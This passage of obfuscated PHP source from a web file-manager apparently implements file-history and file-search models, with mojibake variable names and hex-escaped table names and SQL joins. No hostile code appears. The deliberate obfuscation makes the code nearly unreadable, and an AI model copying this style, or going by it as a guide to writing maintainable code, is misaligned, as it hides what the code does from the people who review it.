$¹ä¹öÕô[$÷¯ÏæÈŸ[2148]] = $¢±Ò‰ü¤[$¹ä¹öÕô[$÷¯ÏæÈŸ[1770]]]; } unset($¹ä¹öÕô); $õËÓ±¡¯[$÷¯ÏæÈŸ[447]] = $ºÔñô‰ı; return $õËÓ±¡¯; } public function removeBySource($±¾Ÿ¹èé) { $•œˆ„Î = array($_SERVER[Š—Â“œÔ][493] => $±¾Ÿ¹èé); $this->where($•œˆ„Î)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\x75\x72\x63\x65\x5f\x68\x69\163\x74\157\x72\x79"; public function historyCount($Ñ÷éœàÀ) { $®Ğ¹²ŞÇ =& $_SERVER[Š—Â“œÔ]; if (!$Ñ÷éœàÀ) { return array(); } if (is_string($Ñ÷éœàÀ) || is_int($Ñ÷éœàÀ)) { $Ñ÷éœàÀ = array($Ñ÷éœàÀ); } $•‡¨ó…” = array($®Ğ¹²ŞÇ[193], $®Ğ¹²ŞÇ[2222] => $®Ğ¹²ŞÇ[567]); $®÷ĞëšÁ = array($®Ğ¹²ŞÇ[193] => array($®Ğ¹²ŞÇ[7], $Ñ÷éœàÀ)); $ØåŸ“ºú = $this->field($•‡¨ó…”)->where($®÷ĞëšÁ)->group($®Ğ¹²ŞÇ[193])->select(); return array_to_keyvalue($ØåŸ“ºú, $®Ğ¹²ŞÇ[193], $®Ğ¹²ŞÇ[567]); } public function addHistory($ÌñĞñ», $éŠë‡µ = '') { $§”šŞÊÍ =& $_SERVER[Š—Â“œÔ]; $€âê´¬È = array($§”šŞÊÍ[493] => $ÌñĞñ»[$§”šŞÊÍ[193]], $§”šŞÊÍ[1761] => isset($ÌñĞñ»[$§”šŞÊÍ[531]]) ? $ÌñĞñ»[$§”šŞÊÍ[531]] : $ÌñĞñ»[$§”šŞÊÍ[529]], $§”šŞÊÍ[544] => $ÌñĞñ»[$§”šŞÊÍ[543]], $§”šŞÊÍ[622] => $ÌñĞñ»[$§”šŞÊÍ[79]], $§”šŞÊÍ[2223] => $éŠë‡µ); if ($GLOBALS[$§”šŞÊÍ[6]][$§”šŞÊÍ[92]][$§”šŞÊÍ[1300]] >= 1) { $this->historyAutoClear($€âê´¬È[$§”šŞÊÍ[193]]); $this->add($€âê´¬È); } Hook::trigger($§”šŞÊÍ[2224], $€âê´¬È); Model($§”šŞÊÍ[2225])->eventFileEdit($ÌñĞñ»[$§”šŞÊÍ[193]]); } private function historyAutoClear($‘²“ş›ó) { $šõƒÒÂ— =& $_SERVER[Š—Â“œÔ]; $¹¾Ççä = Model($šõƒÒÂ—[837])->get($šõƒÒÂ—[1322]); $ãµêî¶¥ = intval($GLOBALS[$šõƒÒÂ—[6]][$šõƒÒÂ—[92]][$šõƒÒÂ—[1300]]); $¤—şË¨» = $¹¾Ççä == $šõƒÒÂ—[1323] ? min(5, $ãµêî¶¥) : $ãµêî¶¥; $¤—şË¨» = $¤—şË¨» <= 0 ? 0 : $¤—şË¨» - 1; if ($¤—şË¨» >= 499) { return; } $Ë›Ü¨«Ê = array($šõƒÒÂ—[493] => $‘²“ş›ó); $•Ü¯ã§ç = $this->field($šõƒÒÂ—[2226])->where($Ë›Ü¨«Ê)->order($šõƒÒÂ—[2219])->select(); if (!$•Ü¯ã§ç || $¤—şË¨» >= count($•Ü¯ã§ç)) { return; } $Ö”±ËåÉ = array_to_keyvalue($•Ü¯ã§ç, $šõƒÒÂ—[12], $šõƒÒÂ—[477]); $Ö”±ËåÉ = array_slice($Ö”±ËåÉ, $¤—şË¨»); $Ù†ÄØüœ = array_to_keyvalue($•Ü¯ã§ç, $šõƒÒÂ—[12], $šõƒÒÂ—[543]); $Ù†ÄØüœ = array_slice($Ù†ÄØüœ, $¤—şË¨»); if (!$Ö”±ËåÉ || !$Ù†ÄØüœ) { return; } $Ë›Ü¨«Ê = array($šõƒÒÂ—[495] => array($šõƒÒÂ—[7], $Ö”±ËåÉ)); $this->where($Ë›Ü¨«Ê)->delete(); Model($šõƒÒÂ—[546])->remove($Ù†ÄØüœ); } public function listData($¼ÛœÅö) { $¼°¬¿ğØ =& $_SERVER[Š—Â“œÔ]; $şµÎŸø² = array($¼°¬¿ğØ[493] => $¼ÛœÅö); $——ÈõÊŒ = $¼°¬¿ğØ[2227]; $åÉçÁ‡ó = $this->field($——ÈõÊŒ)->where($şµÎŸø²)->order($¼°¬¿ğØ[2219])->selectPage(); $this->_listAppendUser($åÉçÁ‡ó[$¼°¬¿ğØ[447]]); $Ì–ıã‡Ú = Model($¼°¬¿ğØ[837])->get($¼°¬¿ğØ[1322]); $İ¨ïïÕÂ = 5; if ($Ì–ıã‡Ú == $¼°¬¿ğØ[1323]) { $åÉçÁ‡ó[$¼°¬¿ğØ[447]] = array_slice($åÉçÁ‡ó[$¼°¬¿ğØ[447]], 0, $İ¨ïïÕÂ); $åÉçÁ‡ó[$¼°¬¿ğØ[444]] = array($¼°¬¿ğØ[2228] => 1, $¼°¬¿ğØ[2229] => 20, $¼°¬¿ğØ[2230] => 1, $¼°¬¿ğØ[2231] => count($åÉçÁ‡ó[$¼°¬¿ğØ[447]])); } return $åÉçÁ‡ó; } protected function _listAppendUser(&$—¡ŞĞí¾) { $ø ¨®¸ =& $_SERVER[Š—Â“œÔ]; $–×ÓÌÎ = array_to_keyvalue($—¡ŞĞí¾, $ø ¨®¸[12], $ø ¨®¸[1770]); $°ù“êÚ– = Model($ø ¨®¸[599])->userListInfo($–×ÓÌÎ); foreach ($—¡ŞĞí¾ as &$±ÁÕÅ×) { $‹©Ïñ¼¢ = $±ÁÕÅ×[$ø ¨®¸[1770]]; $±ÁÕÅ×[$ø ¨®¸[529]] = $°ù“êÚ–[$‹©Ïñ¼¢] ? $°ù“êÚ–[$‹©Ïñ¼¢] : !1; } unset($±ÁÕÅ×); } public function fileInfo($˜Áóå¹) { $À¾üÄ ¾ =& $_SERVER[Š—Â“œÔ]; $²Æéäì = $this->tablePrefix; $ĞÛÜ³Ä = "{$²Æéäì}\x69\157\x5f\146\151\x6c\x65\40\146\151\154\x65\x73\40\x6f\x6e\x20\146\x69\154\145\x73\x2e\146\x69\x6c\145\x49\104\x20\x3d\x20\x68\x69\x73\164\x6f\162\171\56\146\x69\154\145\111\x44"; return $this->alias($À¾üÄ ¾[2232])->where(array($À¾üÄ ¾[495] => $˜Áóå¹))->join($ĞÛÜ³Ä, $À¾üÄ ¾[2233])->find(); } public function removeItem($¼ÅÕ—) { $¤˜¿ù =& $_SERVER[Š—Â“œÔ]; $ÈÕ‚ÆÕÛ = array($¤˜¿ù[495] => $¼ÅÕ—); $Úê£¿¯ô = $this->where($ÈÕ‚ÆÕÛ)->find(); if ($Úê£¿¯ô) { $œ‘¢Æ¥ê = $this->where($ÈÕ‚ÆÕÛ)->delete(); Model($¤˜¿ù[546])->remove($Úê£¿¯ô[$¤˜¿ù[543]]); return $œ‘¢Æ¥ê; } return !1; } public function removeBySource($›Ô¿Â„”) { $‚™¹ù—ª =& $_SERVER[Š—Â“œÔ]; if (!$›Ô¿Â„”) { return !1; } if (!is_array($›Ô¿Â„”)) { $›Ô¿Â„” = array($›Ô¿Â„”); } $èÏŠ¤Èê = array($‚™¹ù—ª[493] => array($‚™¹ù—ª[7], $›Ô¿Â„”)); $Ë„íºƒĞ = $this->field($‚™¹ù—ª[544])->where($èÏŠ¤Èê)->select(); if ($Ë„íºƒĞ) { $this->where($èÏŠ¤Èê)->delete(); $äíóÙ±• = array_to_keyvalue($Ë„íºƒĞ, $‚™¹ù—ª[12], $‚™¹ù—ª[543]); Model($‚™¹ù—ª[546])->remove($äíóÙ±•); } return !0; } public function setDetail($—Êüî•ª, $ÎíÚ´º¯) { $¦íûéæ› =& $_SERVER[Š—Â“œÔ]; return $this->where(array($¦íûéæ›[495] => $—Êüî•ª))->save(array($¦íûéæ›[2223] => $ÎíÚ´º¯)); } public function rollbackToItem($öìşá², $¡Øè¤–Ï) { $Ì…¶ğÍĞ =& $_SERVER[Š—Â“œÔ]; $«ô‘àñÑ = Model($Ì…¶ğÍĞ[892])->sourceInfo($öìşá²); $this->addHistory($«ô‘àñÑ, LNG($Ì…¶ğÍĞ[2234])); $ñ–º’ø‘ = $this->find($¡Øè¤–Ï); $‹¼­£æ¸ = array($Ì…¶ğÍĞ[543] => $ñ–º’ø‘[$Ì…¶ğÍĞ[543]], $Ì…¶ğÍĞ[79] => $ñ–º’ø‘[$Ì…¶ğÍĞ[79]], $Ì…¶ğÍĞ[88] => time(), $Ì…¶ğÍĞ[531] => USER_ID); Model($Ì…¶ğÍĞ[892])->where(array($Ì…¶ğÍĞ[193] => $öìşá²))->save($‹¼­£æ¸); return $this->where(array($Ì…¶ğÍĞ[495] => $¡Øè¤–Ï))->delete(); } public function clearSame($´‡·ŠÇ„) { $©ˆ®è®¶ =& $_SERVER[Š—Â“œÔ]; $˜üÍÅ¥¨ = $this->listData($´‡·ŠÇ„); $£¦ûÄ ˜ = array_to_keyvalue_group($˜üÍÅ¥¨, $©ˆ®è®¶[543]); $ğ¡úÆÄï = array(); $¢¡ì”¡ = array(); foreach ($£¦ûÄ ˜ as $öã¾£Á) { if (!$öã¾£Á || count($öã¾£Á) <= 1) { continue; } foreach ($öã¾£Á as $…‰ÑÄ§é) { $ğ¡úÆÄï[] = $…‰ÑÄ§é[$©ˆ®è®¶[543]]; $¢¡ì”¡[] = $…‰ÑÄ§é[$©ˆ®è®¶[477]]; } } if (!$¢¡ì”¡) { return; } $this->where(array($©ˆ®è®¶[477] => array($©ˆ®è®¶[7], $¢¡ì”¡)))->delete(); Model($©ˆ®è®¶[546])->remove($ğ¡úÆÄï); } public function userSpace() { $ïûİûå¨ =& $_SERVER[Š—Â“œÔ]; $¥ñØáú = $this->tablePrefix; $”Ø·ˆ“£ = array($ïûİûå¨[1761] => USER_ID); $ŞÀ¥’ÆÕ = "{$¥ñØáú}\151\157\x5f\x66\151\x6c\145\40\x66\x69\x6c\145\163\x20\157\156\x20\x66\x69\x6c\x65\163\x2e\146\x69\154\145\x49\x44\40\x3d\x20\150\x69\163\x74\157\x72\x79\x2e\146\x69\154\145\x49\x44"; return $this->alias($ïûİûå¨[2232])->where($”Ø·ˆ“£)->join($ŞÀ¥’ÆÕ, $ïûİûå¨[2233])->sum($ïûİûå¨[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($Ò½Œà®ş) { $˜ôù³¾Ü =& $_SERVER[Š—Â“œÔ]; $¶ƒ¼û° = KodIO::fileTypeList(); $·æò® = $¶ƒ¼û°[$Ò½Œà®ş]; if (!$·æò®) { return array(); } $â ê“¸× = $·æò®[$˜ôù³¾Ü[169]]; $¢õşùœ = $˜ôù³¾Ü[7]; if (!$·æò®[$˜ôù³¾Ü[169]]) { $•Íê¦‰ö = array_to_keyvalue($¶ƒ¼û°, $˜ôù³¾Ü[12], $˜ôù³¾Ü[169]); $â ê“¸× = implode($˜ôù³¾Ü[50], $•Íê¦‰ö); $¢õşùœ = $˜ôù³¾Ü[2235]; } $±½‚ãßõ = explode($˜ôù³¾Ü[50], trim($â ê“¸×, $˜ôù³¾Ü[50])); return array($¢õşùœ, $±½‚ãßõ); } public function listPathType($›Îó™³) { $ˆİõüÖ‚ =& $_SERVER[Š—Â“œÔ]; $Ö‡ä«ò = $this->fileTypeWhere($›Îó™³); if (!$Ö‡ä«ò) { return array(); } $•§©ØÎ‘ = USER_ID; $àÑ¾¼ô = Model($ˆİõüÖ‚[599])->getInfo($•§©ØÎ‘); $Æ˜”ÀĞ¾ = array($ˆİõüÖ‚[653] => SourceModel::TYPE_USER, $ˆİõüÖ‚[586] => array($ˆİõüÖ‚[617], $ˆİõüÖ‚[595] . $àÑ¾¼ô[$ˆİõüÖ‚[90]][$ˆİõüÖ‚[193]] . $ˆİõüÖ‚[618]), $ˆİõüÖ‚[654] => $•§©ØÎ‘, $ˆİõüÖ‚[651] => 0, $ˆİõüÖ‚[652] => $Ö‡ä«ò); return $this->listSource($Æ˜”ÀĞ¾); } public function listSearch($Ìç‘İìñ, $ö¢Şıñ = 300) { $‰¿ï‘› =& $_SERVER[Š—Â“œÔ]; if (isset($Ìç‘İìñ[$‰¿ï‘›[2069]]) && $Ìç‘İìñ[$‰¿ï‘›[2069]]) { $Ìç‘İìñ[$‰¿ï‘›[2069]] = str_replace($‰¿ï‘›[462], $‰¿ï‘›[2236], trim($Ìç‘İìñ[$‰¿ï‘›[2069]])); } $ŞïÕ¥Üğ = $this->_parseSearchWhere($Ìç‘İìñ); if (!isset($ŞïÕ¥Üğ[$‰¿ï‘›[507]])) { $ŞïÕ¥Üğ[$‰¿ï‘›[507]] = 0; } $À«î¦½ä = $‰¿ï‘›[2237]; $ëÍüÉâ“ = $ŞïÕ¥Üğ; $ªïÔÒ¢À = $À«î¦½ä; $this->_listSearchBindPinyin($Ìç‘İìñ, $ŞïÕ¥Üğ, $À«î¦½ä); $this->alias($‰¿ï‘›[521])->_makeOrder(); $ŞïÕ¥Üğ = $this->parseWhereLike($ŞïÕ¥Üğ); $ŒËÔÙëá = $this->distinct(!0)->field($À«î¦½ä)->where($ŞïÕ¥Üğ)->selectPage($ö¢Şıñ); if ($GLOBALS[$‰¿ï‘›[6]][$‰¿ï‘›[459]][$‰¿ï‘›[460]] && Input::check($Ìç‘İìñ[$‰¿ï‘›[2069]], $‰¿ï‘›[660]) && $ŒËÔÙëá[$‰¿ï‘›[444]][$‰¿ï‘›[430]] == 1 && $ŒËÔÙëá[$‰¿ï‘›[444]][$‰¿ï‘›[445]] == 0) { $ŒËÔÙëá = $this->distinct(!0)->field($À«î¦½ä)->where($ëÍüÉâ“)->limit(1000)->select(); $ŒËÔÙëá = array_page_split($ŒËÔÙëá, !1, $ö¢Şıñ); } $this->_listSearchFileContent($ŒËÔÙëá, $Ìç‘İìñ, $ªïÔÒ¢À, $ëÍüÉâ“); $this->_listSearchDesc($ŒËÔÙëá, $Ìç‘İìñ, $ªïÔÒ¢À); $this->_listSearchTag($ŒËÔÙëá, $Ìç‘İìñ, $ªïÔÒ¢À); $this->_listSearchGroupTag($ŒËÔÙëá, $Ìç‘İìñ, $ªïÔÒ¢À); $this->_listDataApply($ŒËÔÙëá[$‰¿ï‘›[447]]); $this->_listMake($ŒËÔÙëá); return $ŒËÔÙëá; } private function _listSearchFileContent(&$•¯àÍ, $Äú‹²“ã, $ÎÂù¼Ò, $‹’Î) { $èšÏ‚µù =& $_SERVER[Š—Â“œÔ]; if (!$Äú‹²“ã[$èšÏ‚µù[2069]] || $•¯àÍ[$èšÏ‚µù[444]][$èšÏ‚µù[430]] > 1) { return; } if (!isset($‹’Î[$èšÏ‚µù[32]]) || !is_array($Äú‹²“ã[$èšÏ‚µù[543]])) { return; } $‹’Î[$èšÏ‚µù[543]] = array($èšÏ‚µù[7], $Äú‹²“ã[$èšÏ‚µù[543]]); unset($‹’Î[$èšÏ‚µù[32]]); unset($Äú‹²“ã[$èšÏ‚µù[543]]); $ëèó»³© = $this->field($ÎÂù¼Ò)->where($‹’Î)->limit($èšÏ‚µù[2238])->select(); if (!$ëèó»³© || count($ëèó»³©) == 0) { return; } $•¯àÍ[$èšÏ‚µù[447]] = array_merge($ëèó»³©, $•¯àÍ[$èšÏ‚µù[447]]); $•¯àÍ[$èšÏ‚µù[444]][$èšÏ‚µù[445]] += count($ëèó»³©); } private function _listSearchTag(&$îá¢œÚù, $èİ€àÙï, $÷á›¥£Ò) { $ëÓà«€ =& $_SERVER[Š—Â“œÔ]; if (!$èİ€àÙï[$ëÓà«€[2069]] || $îá¢œÚù[$ëÓà«€[444]][$ëÓà«€[430]] > 1) { return; } $ìã”£«™ = Model($ëÓà«€[2239])->listData(); $·Õ‚µ˜ = array(); $íë• = $èİ€àÙï[$ëÓà«€[2069]]; foreach ($ìã”£«™ as $ì¢ÊºÚ) { $²˜ã§‡’ = $ì¢ÊºÚ[$ëÓà«€[32]]; $á™‡§Û = str_replace($ëÓà«€[53], $ëÓà«€[12], Pinyin::get($²˜ã§‡’)); if (stripos($²˜ã§‡’, $íë•) !== !1 || stripos($á™‡§Û, $íë•) !== !1) { $·Õ‚µ˜[] = $ì¢ÊºÚ[$ëÓà«€[477]]; } } if (!$·Õ‚µ˜) { return; } $óÁŞØÄ = array($ëÓà«€[502] => array($ëÓà«€[7], $·Õ‚µ˜), $ëÓà«€[1770] => USER_ID); $ıÛàòÂĞ = Model($ëÓà«€[504])->field($ëÓà«€[87])->where($óÁŞØÄ)->select(); $ıÛàòÂĞ = array_to_keyvalue($ıÛàòÂĞ, $ëÓà«€[12], $ëÓà«€[87]); $ğÂ¢•É® = array_unique($ıÛàòÂĞ); $this->_listSearchMerge($îá¢œÚù, $èİ€àÙï, $÷á›¥£Ò, $ğÂ¢•É®); } private function _listSearchDesc(&$à¯‹´ì, $†•øû·ş, $â¨ä”·) { $©Ë¬²¡ =& $_SERVER[Š—Â“œÔ]; if (!$†•øû·ş[$©Ë¬²¡[2069]] || $à¯‹´ì[$©Ë¬²¡[444]][$©Ë¬²¡[430]] > 1) { return; } $„«Üú˜Ø = array($©Ë¬²¡[97] => $©Ë¬²¡[528], $©Ë¬²¡[452] => array($©Ë¬²¡[461], $©Ë¬²¡[2071] . $†•øû·ş[$©Ë¬²¡[2069]] . $©Ë¬²¡[2071])); $€ÀåÄâÛ = !1; if ($€ÀåÄâÛ) { $²ƒìşÕ© = $this->listSearchChildren($†•øû·ş[$©Ë¬²¡[192]]); $²ƒìşÕ© = array_unique($²ƒìşÕ©); if (!$²ƒìşÕ©) { return; } $„«Üú˜Ø[$©Ë¬²¡[193]] = array($©Ë¬²¡[7], $²ƒìşÕ©); } $öÃŸ‰æ± = Model($©Ë¬²¡[637])->field($©Ë¬²¡[193])->where($„«Üú˜Ø)->limit(5000)->select(); $­êŒê¬ = array_to_keyvalue($öÃŸ‰æ±, $©Ë¬²¡[12], $©Ë¬²¡[193]); $this->_listSearchMerge($à¯‹´ì, $†•øû·ş, $â¨ä”·, $­êŒê¬); } private function _listSearchGroupTag(&$ÆœƒÜşº, $Õİç¶¸Ø, $ûŒ«ù) { $œß‹ÅíÑ =& $_SERVER[Š—Â“œÔ]; if (!$Õİç¶¸Ø[$œß‹ÅíÑ[2069]] || $ÆœƒÜşº[$œß‹ÅíÑ[444]][$œß‹ÅíÑ[430]] > 1 || !$Õİç¶¸Ø[$œß‹ÅíÑ[192]]) { return; } $Ïœú Ø = $this->sourceInfo($Õİç¶¸Ø[$œß‹ÅíÑ[192]]); if (!$Ïœú Ø || $Ïœú Ø[$œß‹ÅíÑ[190]] != SourceModel::TYPE_GROUP) { return; } $°ã£ß·Ÿ = $Ïœú Ø[$œß‹ÅíÑ[571]]; $Û¹Úòä  = Model($œß‹ÅíÑ[2240])->get($°ã£ß·Ÿ); $öÓµ« = array(); $¦û­ĞÔ” = $Õİç¶¸Ø[$œß‹ÅíÑ[2069]]; foreach ($Û¹Úòä [$œß‹ÅíÑ[447]] as $¿Úèæø¢) { $£µâöÌ‘ = $¿Úèæø¢[$œß‹ÅíÑ[32]]; $ìŞ„Ó¤Ú = str_replace($œß‹ÅíÑ[53], $œß‹ÅíÑ[12], Pinyin::get($£µâöÌ‘)); if (stripos($£µâöÌ‘, $¦û­ĞÔ”) !== !1 || stripos($ìŞ„Ó¤Ú, $¦û­ĞÔ”) !== !1) { $öÓµ«[] = $¿Úèæø¢[$œß‹ÅíÑ[477]]; } } if (!$öÓµ«) { return; } $†ÔüÓÅê = array($œß‹ÅíÑ[502] => array($œß‹ÅíÑ[7], $öÓµ«), $œß‹ÅíÑ[1770] => 0, $œß‹ÅíÑ[33] => $œß‹ÅíÑ[2091] . $°ã£ß·Ÿ); $±Ó°ì« = Model($œß‹ÅíÑ[504])->field($œß‹ÅíÑ[87])->where($†ÔüÓÅê)->select(); $±Ó°ì« = array_to_keyvalue($±Ó°ì«, $œß‹ÅíÑ[12], $œß‹ÅíÑ[87]); $Ç™ş ôÃ = array_unique($±Ó°ì«); $this->_listSearchMerge($ÆœƒÜşº, $Õİç¶¸Ø, $ûŒ«ù, $Ç™ş ôÃ); } private function _listSearchMerge(&$ÜÈàà‘, $à­æŒğæ, $øÑ£ô, $ŠÈã÷ãê) { $¹ÌÒÊçş =& $_SERVER[Š—Â“œÔ]; if (!$ŠÈã÷ãê) { return; } $üà¼ˆë¢ = array_to_keyvalue($ÜÈàà‘[$¹ÌÒÊçş[447]], $¹ÌÒÊçş[12], $¹ÌÒÊçş[193]); $ö®¿Ïİê = array_diff($ŠÈã÷ãê, $üà¼ˆë¢); if (!$ö®¿Ïİê) { return; } $æ Á²åì = array($¹ÌÒÊçş[193] => array($¹ÌÒÊçş[7], $ö®¿Ïİê)); $ğ§ôŠºŸ = $this->field($øÑ£ô)->where($æ Á²åì)->select(); if (!$ğ§ôŠºŸ) { return; } $öïíŒÇ = array(); foreach ($ğ§ôŠºŸ as $‰²Ñû¨) { if ($this->_listSearchFilter($‰²Ñû¨, $à­æŒğæ)) { $öïíŒÇ[] = $‰²Ñû¨; } } $ÜÈàà‘[$¹ÌÒÊçş[447]] = array_merge($öïíŒÇ, $ÜÈàà‘[$¹ÌÒÊçş[447]]); $ÜÈàà‘[$¹ÌÒÊçş[444]][$¹ÌÒÊçş[445]] += count($öïíŒÇ); } private function _listSearchFilter($Ø›¤±œ€, $×£áõ ´) { $÷¶ù¥¸ =& $_SERVER[Š—Â“œÔ]; $µ·ÚÚªÌ = $Ø›¤±œ€[$÷¶ù¥¸[487]] == $÷¶ù¥¸[91]; if (!strstr($Ø›¤±œ€[$÷¶ù¥¸[586]], $÷¶ù¥¸[50] . $×£áõ ´[$÷¶ù¥¸[192]] . $÷¶ù¥¸[50])) { return !1; } if (isset($×£áõ ´[$÷¶ù¥¸[488]]) && $×£áõ ´[$÷¶ù¥¸[488]] != $÷¶ù¥¸[843]) { if ($×£áõ ´[$÷¶ù¥¸[488]] == $÷¶ù¥¸[78] && !$µ·ÚÚªÌ) { return !1; } if ($×£áõ ´[$÷¶ù¥¸[488]] != $÷¶ù¥¸[78] && $µ·ÚÚªÌ) { return !1; } if (!strstr($Ø›¤±œ€[$÷¶ù¥¸[169]], $÷¶ù¥¸[50] . $×£áõ ´[$÷¶ù¥¸[488]] . $÷¶ù¥¸[50])) { return !1; } } if (isset($×£áõ ´[$÷¶ù¥¸[2241]]) && $×£áõ ´[$÷¶ù¥¸[2241]] < $Ø›¤±œ€[$÷¶ù¥¸[79]]) { return !1; } if (isset($×£áõ ´[$÷¶ù¥¸[2242]]) && $×£áõ ´[$÷¶ù¥¸[2242]] > $Ø›¤±œ€[$÷¶ù¥¸[79]]) { return !1; } if (isset($×£áõ ´[$÷¶ù¥¸[667]]) && $×£áõ ´[$÷¶ù¥¸[667]] != $Ø›¤±œ€[$÷¶ù¥¸[531]]) { return !1; } return !0; } public function listSearchChildren($æ’ºŠŠ¶, $º§³êÃ = 5000) { $çÅõğÕÙ =& $_SERVER[Š—Â“œÔ]; $Ôç¡ã„à = array(); $ş°Ì’Æµ = $this->sourceInfo($æ’ºŠŠ¶); $ß¸³¥ôú = array($çÅõğÕÙ[586] => array($çÅõğÕÙ[461], $ş°Ì’Æµ[$çÅõğÕÙ[586]] . $ş°Ì’Æµ[$çÅõğÕÙ[193]] . $çÅõğÕÙ[618])); $Óşœéó® = $this->field($çÅõğÕÙ[79])->where($ß¸³¥ôú)->limit($º§³êÃ + 1)->select(); $¢ŸÛ¶ôÙ = is_array($Óşœéó®) ? count($Óşœéó®) : 0; if ($¢ŸÛ¶ôÙ > $º§³êÃ) { return $this->_listSearchChildrenNear($æ’ºŠŠ¶, $º§³êÃ); } $©‘î•Í¯ = $this->field($çÅõğÕÙ[193])->where($ß¸³¥ôú)->select(); $Ôç¡ã„à = array_to_keyvalue($©‘î•Í¯, $çÅõğÕÙ[12], $çÅõğÕÙ[193]); return $Ôç¡ã„à; } private function _listSearchChildrenNear($¯ƒ¹­”—, $Á‘û—µ) { $òÕôÙ±˜ =& $_SERVER[Š—Â“œÔ]; $õšŞò€õ = array(); $¹©©Ê¸ã = array($òÕôÙ±˜[192] => $¯ƒ¹­”—); $»ˆĞÁÜ = $this->field($òÕôÙ±˜[2243])->where($¹©©Ê¸ã)->select(); $Ù†¤ñ = array_to_keyvalue(array_filter_by_field($»ˆĞÁÜ, $òÕôÙ±˜[487], $òÕôÙ±˜[91]), $òÕôÙ±˜[12], $òÕôÙ±˜[193]); $õšŞò€õ = array_merge($õšŞò€õ, array_to_keyvalue($»ˆĞÁÜ, $òÕôÙ±˜[12], $òÕôÙ±˜[193])); if (!$Ù†¤ñ) { return $õšŞò€õ; } $¹©©Ê¸ã = array($òÕôÙ±˜[192] => array($òÕôÙ±˜[7], $Ù†¤ñ)); $»ˆĞÁÜ = $this->field($òÕôÙ±˜[2243])->where($¹©©Ê¸ã)->limit($Á‘û—µ)->select(); $õšŞò€õ = array_merge($õšŞò€õ, array_to_keyvalue($»ˆĞÁÜ, $òÕôÙ±˜[12], $òÕôÙ±˜[193])); $õšŞò€õ = array_slice($õšŞò€õ, 0, intval($Á‘û—µ)); return $õšŞò€õ; } private function _listSearchBindPinyin($¥õ¸Úú¨, &$¯ùİºÄ›, &$¾“ÒËƒ‰) { $¬µô¹„ =& $_SERVER[Š—Â“œÔ]; if (!isset($¥õ¸Úú¨[$¬µô¹„[2069]]) || !$¥õ¸Úú¨[$¬µô¹„[2069]]) { return; } if (!Input::check($¥õ¸Úú¨[$¬µô¹„[2069]], $¬µô¹„[395]) || strlen($¥õ¸Úú¨[$¬µô¹„[2069]]) < 2) { return; } $¬û‘Ò›† = "\114\105\106\124\x20\x4a\x4f\x49\x4e\40{$this->tablePrefix}\x69\x6f\137\x73\157\165\162\x63\145\137\155\145\x74\141\x20\155\x65\x74\x61\40\x6f\x6e\x20\163\157\x75\x72\143\145\x2e\163\157\165\x72\x63\x65\111\104\40\75\x20\155\x65\x74\141\x2e\x73\x6f\165\162\x63\x65\x49\x44"; $¨Öı¥í– = array(); $¾“ÒËƒ‰ = str_replace(array($¬µô¹„[287], $¬µô¹„[53], $¬µô¹„[2244]), $¬µô¹„[12], $¾“ÒËƒ‰); $¾“ÒËƒ‰ = $¬µô¹„[513] . str_replace($¬µô¹„[50], $¬µô¹„[514], $¾“ÒËƒ‰); $Óšá¹¨ª = $¯ùİºÄ›[$¬µô¹„[32]]; unset($¯ùİºÄ›[$¬µô¹„[32]]); foreach ($¯ùİºÄ› as $Ì†ÒÊÇÉ => $“»±Ü‚Å) { $¨Öı¥í–[$¬µô¹„[513] . $Ì†ÒÊÇÉ] = $“»±Ü‚Å; } foreach ($Óšá¹¨ª as $âÎÄµÇ‡) { $¨Öı¥í–[] = array($¬µô¹„[518] => $âÎÄµÇ‡, $¬µô¹„[1074] => $¬µô¹„[2073], array($¬µô¹„[2245] => $âÎÄµÇ‡, $¬µô¹„[2246] => array($¬µô¹„[7], array($¬µô¹„[540], $¬µô¹„[539])))); } $this->join($¬û‘Ò›†); $¯ùİºÄ› = $¨Öı¥í–; } private function _parseSearchWhere($ë¾¸ˆ¤‹) { $÷İÁàú… =& $_SERVER[Š—Â“œÔ]; $‡°Å¿§ = array(); if (isset($ë¾¸ˆ¤‹[$÷İÁàú…[827]]) && $ë¾¸ˆ¤‹[$÷İÁàú…[827]]) { $‡°Å¿§[$÷İÁàú…[88]] = array($÷İÁàú…[2247], $ë¾¸ˆ¤‹[$÷İÁàú…[827]]); } if (isset($ë¾¸ˆ¤‹[$÷İÁàú…[828]]) && $ë¾¸ˆ¤‹[$÷İÁàú…[828]]) { $öğÓÆÚÏ = array($÷İÁàú…[2248], $ë¾¸ˆ¤‹[$÷İÁàú…[828]]); if ($‡°Å¿§[$÷İÁàú…[88]]) { $‡°Å¿§[$÷İÁàú…[88]] = array($‡°Å¿§[$÷İÁàú…[88]], $öğÓÆÚÏ, $÷İÁàú…[2249]); } else { $‡°Å¿§[$÷İÁàú…[88]] = $öğÓÆÚÏ; } } if (isset($ë¾¸ˆ¤‹[$÷İÁàú…[2241]]) && $ë¾¸ˆ¤‹[$÷İÁàú…[2241]] > 0) { $‡°Å¿§[$÷İÁàú…[79]] = array($÷İÁàú…[2247], $ë¾¸ˆ¤‹[$÷İÁàú…[2241]]); } if (isset($ë¾¸ˆ¤‹[$÷İÁàú…[2242]]) && $ë¾¸ˆ¤‹[$÷İÁàú…[2242]]) { $öğÓÆÚÏ = array($÷İÁàú…[2248], $ë¾¸ˆ¤‹[$÷İÁàú…[2242]]); if ($‡°Å¿§[$÷İÁàú…[79]]) { $‡°Å¿§[$÷İÁàú…[79]] = array($‡°Å¿§[$÷İÁàú…[79]], $öğÓÆÚÏ, $÷İÁàú…[2249]); } else { $‡°Å¿§[$÷İÁàú…[79]] = $öğÓÆÚÏ; } } if (isset($ë¾¸ˆ¤‹[$÷İÁàú…[667]]) && $ë¾¸ˆ¤‹[$÷İÁàú…[667]]) { $‡°Å¿§[] = array($÷İÁàú…[531] => $ë¾¸ˆ¤‹[$÷İÁàú…[667]], $÷İÁàú…[529] => $ë¾¸ˆ¤‹[$÷İÁàú…[667]], $÷İÁàú…[1074] => $÷İÁàú…[2073]); } if (isset($ë¾¸ˆ¤‹[$÷İÁàú…[488]]) && $ë¾¸ˆ¤‹[$÷İÁàú…[488]]) { $Ÿ¥ÆÂì­ = $ë¾¸ˆ¤‹[$÷İÁàú…[488]]; if ($Ÿ¥ÆÂì­ == $÷İÁàú…[78]) { $‡°Å¿§[$÷İÁàú…[487]] = 1; } else { if ($Ÿ¥ÆÂì­ == $÷İÁàú…[2250]) { $‡°Å¿§[$÷İÁàú…[487]] = 0; } else { if ($Ÿ¥ÆÂì­) { 